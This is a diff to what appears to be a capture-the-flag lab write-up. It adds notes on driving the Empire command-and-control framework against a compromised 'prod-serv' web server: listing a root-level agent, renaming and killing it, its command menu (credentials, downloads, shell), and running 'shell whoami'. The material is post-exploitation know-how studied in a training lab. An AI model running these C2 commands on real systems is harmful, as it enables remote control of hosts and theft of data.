@@ -1933,7 +1933,7 @@ We can run the command on the target (webserver)
 ```
 
 And we get our agent
-
+```
 (Empire: stager/multi/bash) > listeners
 
 [*] Active listeners:
@@ -1951,7 +1951,91 @@ And we get our agent
 [!] strip_python_comments is deprecated and should not be used
 ```
 
+We can interact with the agent
+```
+agents
 
+[*] Active agents:
+                                                                                                                                                                                                             
+ Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener
+ ----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------
+ XLNAM69P py 10.200.85.200   prod-serv         *root                   python3            2166   5/0.0    2021-04-20 10:07:36  Webserver       
+
+(Empire: agents) > interact XLNAM69P
+(Empire: XLNAM69P) > back
+
+
+```
+
+We can also rename agent
+```
+(Empire: agents) > rename XLNAM69P webbie
+```
+
+And see the help menu
+```
+(Empire: agents) > interact webbie
+(Empire: webbie) > help
+
+Agent Commands
+==============
+agents            Jump to the agents menu.
+back              Go back a menu.
+cat               View the contents of a file
+cd                Change an agent's active directory
+clear             Clear out agent tasking.
+creds             Display/return credentials from the database.
+dirlist           Tasks an agent to store the contents of a directory in the database.
+download          Task an agent to download a file into the C2.
+exit              Task agent to exit.
+help              Displays the help menu or syntax for particular commands.
+info              Display information about this agent
+jobs              Return jobs or kill a running job.
+killdate          Get or set an agent's killdate (01/01/2016).
+list              Lists all active agents (or listeners).
+listeners         Jump to the listeners menu.
+loadpymodule      Import zip file containing a .py module or package with an __init__.py
+lostlimit         Task an agent to display change the limit on lost agent detection
+main              Go back to the main menu.
+osx_screenshot    Use the python-mss module to take a screenshot, and save the image to the server. Not opsec safe
+python            Task an agent to run a Python command.
+pythonscript      Load and execute a python script
+removerepo        Remove a repo
+rename            Rename the agent.
+resource          Read and execute a list of Empire commands from a file.
+searchmodule      Search Empire module names/descriptions.
+shell             Task an agent to use a shell command.
+sleep             Task an agent to 'sleep interval [jitter]'
+sysinfo           Task an agent to get system information.
+upload            Task the C2 to upload a file into an agent.
+usemodule         Use an Empire Python module.
+viewrepo          View the contents of a repo. if none is specified, all files will be returned
+workinghours      Get or set an agent's working hours (9:00-17:00).
+```
+
+We can also kill an agent 
+```
+(Empire: agents) > kill webbie
+[>] Kill agent 'webbie'? [y/N] y
+[*] Tasked XLNAM69P to run TASK_EXIT
+[*] Agent XLNAM69P tasked with task ID 2
+(Empire: agents) > [!] Agent XLNAM69P exiting
+[*] Agent XLNAM69P deleted
+
+```
+
+Run commands
+```
+Empire: webbie) > shell whoami
+[*] Tasked XLNAM69P to run TASK_SHELL
+[*] Agent XLNAM69P tasked with task ID 1
+(Empire: webbie) > 
+root
+ ..Command execution completed.
+```
+
+
+### Hop Listeners
 
 
 </details>
